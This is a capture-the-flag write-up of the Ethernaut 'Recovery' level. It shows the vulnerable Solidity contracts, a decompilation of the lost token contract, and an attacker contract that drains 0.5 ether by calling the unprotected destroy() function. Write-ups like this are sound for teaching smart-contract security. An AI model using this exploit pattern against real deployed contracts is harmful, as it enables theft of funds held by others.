## 17. Recovery

Goal for this exercise is:

- Recover (or remove) 0.5 ether from the lost contract address


<br/>

Here is the contract code:
~~~
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Recovery {

  //generate tokens
  function generateToken(string memory _name, uint256 _initialSupply) public {
    new SimpleToken(_name, msg.sender, _initialSupply);
  
  }
}

contract SimpleToken {

  using SafeMath for uint256;
  // public variables
  string public name;
  mapping (address => uint) public balances;

  // constructor
  constructor(string memory _name, address _creator, uint256 _initialSupply) public {
    name = _name;
    balances[_creator] = _initialSupply;
  }

  // collect ether in return for tokens
  fallback() external payable {
    balances[msg.sender] = msg.value.mul(10);
  }

  // allow transfers of tokens
  function transfer(address _to, uint _amount) public { 
    require(balances[msg.sender] >= _amount);
    balances[msg.sender] = balances[msg.sender].sub(_amount);
    balances[_to] = _amount;
  }

  // clean up after ourselves
  function destroy(address payable _to) public {
    selfdestruct(_to);
  }
}
~~~

<br>

By looking at the contract creation transaction with rinkeby.etherscan.io two additional sends come up.
One for 1 eth and one for 0.5 eth, mayby the one with 0.5 eth is our lost SimpleToken contract address. 

Closer look into 0.5 eth address with etherscan.io EVM bytecode decompiler reveals our "lost" SimpleToken contract:
~~~
#
#  Panoramix v4 Oct 2019 
#  Decompiled source of rinkeby:0x1234...
# 
#  Let's make the world open source 
# 
#
#  I failed with these: 
#  - _fallback()
#  All the rest is below.
#

def storage:
  name is array of uint256 at storage 0
  balances is mapping of uint256 at storage 1

def name(): # not payable
  return name[0 len name.length]

def balances(address _param1): # not payable
  require calldata.size - 4 >= 32
  return balances[_param1]

#
#  Regular functions
#

def destroy(address _to): # not payable
  require calldata.size - 4 >= 32
  selfdestruct(_to)

def transfer(address _to, uint256 _value): # not payable
  require calldata.size - 4 >= 64
  require balances[caller] >= _value
  if _value > balances[caller]:
      revert with 0, 'SafeMath: subtraction overflow'
  balances[caller] -= _value
  balances[addr(_to)] = _value
~~~

<br>

Now we can recover funds by calling`destroy()`function.

Here is a contract for it:
~~~
pragma solidity ^0.6.0;

interface SimpleToken {
  function destroy(address payable _to) external;
}

contract Recover {

    SimpleToken simpleToken = SimpleToken(0x1234...);
    address payable owner;
    
    // fund contract here    
    constructor() public payable {
        owner = msg.sender;
    }
    
    receive() external payable {}
    
    function callDestroy() public {
        // lets destroy SimpleToken contract and recover funds here
        simpleToken.destroy(address(this));
    }

    // get funds back
    function withdraw() external {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }    
    
}
~~~
